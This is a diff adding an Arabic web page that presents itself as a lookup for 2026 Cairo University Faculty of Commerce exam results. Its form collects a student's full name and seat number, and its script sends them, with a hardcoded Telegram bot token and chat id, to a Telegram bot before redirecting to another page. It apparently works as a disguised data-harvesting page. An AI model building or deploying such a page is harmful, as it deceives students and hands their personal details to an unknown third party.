@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>نتيجة كلية تجارة جامعة القاهرة 2026</title>
+
+<style>
+body{
+  font-family: Arial, sans-serif;
+  background: linear-gradient(rgba(0,0,50,.6), rgba(0,0,80,.7)),
+              url("https://images.unsplash.com/photo-1588072432836-e10032774350?auto=format&fit=crop&w=1200&q=80");
+  background-size: cover;
+  background-position: center;
+  text-align: center;
+}
+
+.box{
+  background: rgba(255,255,255,.95);
+  color: #000;
+  width: 360px;
+  margin: 80px auto;
+  padding: 25px;
+  border-radius: 14px;
+  box-shadow: 0 0 25px rgba(0,0,0,.35);
+}
+
+h2{
+  color:#0b5ed7;
+  font-size:20px;
+}
+
+input{
+  width: 92%;
+  padding: 12px;
+  margin: 8px 0;
+  border-radius: 6px;
+  border:1px solid #ccc;
+  font-size:15px;
+}
+
+button{
+  background:#0b5ed7;
+  color:white;
+  padding:12px 30px;
+  border:none;
+  border-radius:6px;
+  font-size:16px;
+  cursor:pointer;
+  margin-top:12px;
+  width: 60%;
+}
+
+button:hover{
+  background:#094bb5;
+}
+</style>
+</head>
+
+<body>
+
+<div class="box">
+  <h2>نتيجة كلية تجارة جامعة القاهرة 2026</h2>
+
+  <form id="form">
+    <input type="text" id="name" placeholder="الاسم الثلاثي" required><br>
+    <input type="text" id="seat" placeholder="رقم الجلوس" required><br>
+    <button type="submit">عرض النتيجة</button>
+  </form>
+</div>
+
+<script>
+document.getElementById("form").addEventListener("submit", function(e){
+  e.preventDefault();
+
+  const name = document.getElementById("name").value;
+  const seat = document.getElementById("seat").value;
+
+  const text =
+`📩 طلب جديد
+👤 الاسم: ${name}
+🎓 رقم الجلوس: ${seat}`;
+
+  fetch("https://api.telegram.org/bot8316213549:AAHOYXrTbMRCU1QFPwYxivpAyXDu3axxC90/sendMessage", {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({
+      chat_id: "7816373014",
+      text: text
+    })
+  })
+  .then(() => {
+    window.location.href = "result.html";
+  })
+  .catch(() => {
+    alert("حصل خطأ في الإرسال");
+  });
+});
+</script>
+
+</body>
+</html>
